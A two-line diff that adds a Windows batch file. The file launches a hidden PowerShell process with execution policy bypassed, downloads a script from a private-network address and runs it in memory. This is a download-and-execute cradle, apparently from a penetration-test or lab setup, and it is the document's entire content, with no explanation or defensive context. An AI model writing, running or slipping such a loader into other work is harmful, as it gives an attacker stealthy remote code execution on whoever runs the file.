@@ -1,0 +1,2 @@
+@echo off
+powershell.exe -exec bypass -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.49.147/PS/run.ps1')"
